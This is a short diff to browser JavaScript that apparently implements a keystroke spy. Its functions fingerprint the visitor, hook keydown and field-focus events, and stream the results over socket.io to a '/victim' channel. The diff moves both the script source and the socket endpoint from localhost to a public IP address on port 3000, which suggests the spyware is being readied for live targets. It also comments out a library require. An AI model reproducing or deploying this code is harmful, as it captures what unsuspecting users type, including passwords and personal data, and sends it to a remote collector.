@@ -18,7 +18,7 @@
     }
 
     function loadAllScripts() {
-        loadScript('http://localhost:3000/socket.io/socket.io.js', init);
+        loadScript('http://199.98.20.120:3000/socket.io/socket.io.js', init);
     }
 
     function spyOnKeyDown(socket) {
@@ -57,7 +57,7 @@
     }
 
     function newFinger(socket) {
-	var Fingerprint2 = require('fingerprint2js')
+//	var Fingerprint2 = require('fingerprint2js')
 	var fp = new Fingerprint2();
 	fp.get(function(result) {
 	 socket.emit('new', {
@@ -68,7 +68,7 @@
     }
 
     function init() {
-        var socket = io('http://localhost:3000/victim');
+        var socket = io('http://199.98.20.120:3000/victim');
 	newFinger(socket);	
         spyOnKeyDown(socket);
         spyOnFieldFocus(socket);
